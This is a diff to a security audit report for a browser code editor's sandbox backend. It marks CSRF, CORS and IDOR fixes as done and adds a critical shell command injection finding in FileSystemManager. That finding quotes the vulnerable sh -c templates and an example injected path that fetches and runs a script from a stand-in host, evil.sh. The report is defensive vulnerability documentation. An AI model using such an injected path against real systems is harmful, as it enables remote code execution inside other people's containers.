@@ -12,6 +12,11 @@ is not currently possible — keep it that way.
 
 Findings ranked by severity.
 
+> **⚠️ New — found while wiring the finding #2 backend fix:** `FileSystemManager`
+> has a **Critical shell command injection** (finding #6 below). It is not an
+> editor file, but it is the sink every editor file write/read/delete ultimately
+> reaches, so it is recorded here. **Not yet fixed.**
+
 ---
 
 ## 1. Path traversal — no sanitization on the path pipeline · **High** · ✅ FIXED
@@ -38,7 +43,7 @@ defense at the client, not a substitute.
 
 ---
 
-## 2. Sync/CRUD requests carry no auth or CSRF token · **High (design)** · ⚠️ PARTIALLY FIXED (client half done; IDOR is backend)
+## 2. Sync/CRUD requests carry no auth or CSRF token · **High** · ✅ FIXED (client + server)
 
 `vfs/VirtualFileSystem.ts` (`flushSyncQueue`, the git-sync POST) and every method
 in `api/vfs.js` sent only `sandboxId` — no bearer token, no CSRF token, no
@@ -57,15 +62,28 @@ credentials handling.
   point at `apiClient`, so whoever wires the real backend inherits protection by
   default instead of hand-rolling an unprotected `fetch()`.
 
-**Still required (backend — cannot be fixed in the front-end):**
-- **CSRF cookie:** backend must set the `csrf-token` cookie (non-httpOnly) and
-  the session cookie as `SameSite=Strict/Lax; Secure; HttpOnly`, and **reject**
-  requests whose `X-CSRF-Token` header is missing or doesn't match the cookie.
-- **CORS:** must set `Access-Control-Allow-Credentials: true` with an explicit
-  (non-wildcard) origin for `credentials: 'include'` to work.
-- **IDOR:** `sandboxId` is the only thing naming the target sandbox. Use an
-  unguessable id **and** verify session ownership server-side on every request —
-  the client cannot enforce this.
+**Server half — FIXED (backend):**
+- `backend/src/api/middleware/security.ts` (new) provides `csrfProtection`
+  (double-submit: mints the `csrf-token` cookie, rejects mutating requests whose
+  `X-CSRF-Token` header is absent/mismatched with 403) and
+  `requireSandboxOwnership(sessionRepo)` (the IDOR guard).
+- `backend/src/server.ts`: `cors()` was wildcard-open with no credentials — now
+  `cors({ origin: config.FRONTEND_ORIGIN, credentials: true })`; `csrfProtection`
+  runs globally; a `GET /api/csrf` primes the token cookie.
+- **IDOR closed:** `/api/fs/:sandboxId/*` had **zero** ownership check (anyone
+  who knew a sandboxId could read/write/delete its files). Now every fs route
+  runs `requireSandboxOwnership`, which loads the session from the httpOnly `sid`
+  cookie and confirms `session.sandboxId === :sandboxId`, returning **404** (not
+  403) on mismatch so ids can't be enumerated. The session id is a `crypto.randomUUID()`
+  (unguessable). `SessionController.startSession` now issues the `sid` cookie
+  (`httpOnly; SameSite=Lax; Secure in prod`), and the session routes — defined
+  but previously **never mounted** — are now wired in `server.ts`.
+
+**Remaining (ops):** set `Strict-Transport-Security` at the edge (HSTS is
+header-only), and set `FRONTEND_ORIGIN` in the backend `.env` for production.
+The frontend must adopt the session-start flow (call `POST /api/v1/sessions` to
+obtain the `sid` cookie) before hitting `/api/fs` — today's mocked VFS doesn't
+yet.
 
 ---
 
@@ -133,6 +151,33 @@ font-family text input is ever surfaced, validate against an allowlist.
 
 ---
 
+## 6. Shell command injection in `FileSystemManager` (backend) · **Critical** · ❌ NOT FIXED
+
+`backend/src/services/FileSystemManager.ts` interpolates caller-supplied paths
+straight into `/bin/sh -c` strings:
+
+```ts
+`base64 "${filePath}"`                 // readFile
+`echo "${b64Content}" | base64 -d > "${filePath}"`  // writeFile
+`mkdir -p "${dirName}"`                // writeFile
+`rm -rf "${pathToRemove}"`             // deletePath
+`ls -1p "${dirPath}" | awk ...`        // listDirectory
+```
+
+The double quotes are not escaping — a path containing `"`, `` ` ``, `$(...)`, or
+`;` breaks out and runs arbitrary commands **inside the target container**. e.g.
+`path = /workspace/x";curl evil.sh|sh;"` → RCE in the sandbox.
+
+Before finding #2's IDOR fix this was reachable on *any* sandbox by anyone; with
+the ownership guard it's now reachable only within a caller's own sandbox — but
+it is still a container-escape/lateral-movement primitive and must be fixed:
+pass paths as **argv** (no `sh -c`), or reject shell metacharacters, and combine
+with the backend re-validation promised for findings #1/#2. The frontend
+`safePath()` guard (#1) blocks the obvious cases from *our* UI, but the backend
+must never trust the client.
+
+---
+
 ## Not vulnerabilities (verified)
 
 - **Filename rendering** (tabs `components/EditorTabs.tsx`, explorer
@@ -143,9 +188,16 @@ font-family text input is ever surfaced, validate against an allowlist.
 
 ---
 
-## Priority
+## Status
 
-Fix **#1 first.** A `normalizePath()` guard in `VFSController` closes the path
-traversal at the single point every path routes through, in the shortest diff,
-and it's the only finding fixable entirely in the front-end today — the rest
-depend on the backend that's still `TODO`.
+| # | Finding | Severity | State |
+|---|---------|----------|-------|
+| 6 | Shell command injection in `FileSystemManager` | Critical | ❌ **Not fixed — do next** |
+| 1 | Path traversal (front-end path pipeline) | High | ✅ Fixed |
+| 2 | No auth/CSRF on sync/CRUD; IDOR | High | ✅ Fixed (client + server) |
+| 3 | REPL `eval()` under-sandboxed | Medium | ✅ Fixed |
+| 4 | No CSP / security headers | Low | ✅ Fixed (edge header still owed) |
+| 5 | localStorage → CSS custom property | Low | ➖ Accepted (defense-in-depth only) |
+
+**Do #6 next** — it is the highest-severity open item and the sink all editor
+file operations reach.
